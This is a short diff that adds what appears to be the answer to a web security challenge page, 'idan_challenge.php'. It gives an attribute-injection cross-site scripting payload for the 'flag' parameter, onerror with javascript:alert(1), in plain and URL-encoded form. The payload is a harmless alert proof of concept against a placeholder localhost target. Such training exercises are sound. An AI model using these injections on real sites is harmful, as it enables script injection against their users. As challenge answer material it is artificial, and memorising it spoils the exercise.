@@ -1,0 +1,8 @@
+Original URL:
+http://{LOCALHOST}/{PATH}/idan_challenge.php?flag=Ukraine
+
+Answer URL:
+http://{LOCALHOST}/{PATH}/idan_challenge.php?flag=x onerror="javascript:alert(1)"
+
+Encoded Answer URL:
+http://{LOCALHOST}/{PATH}/idan_challenge.php?flag=x%20onerror=%22javascript:alert(1)%22
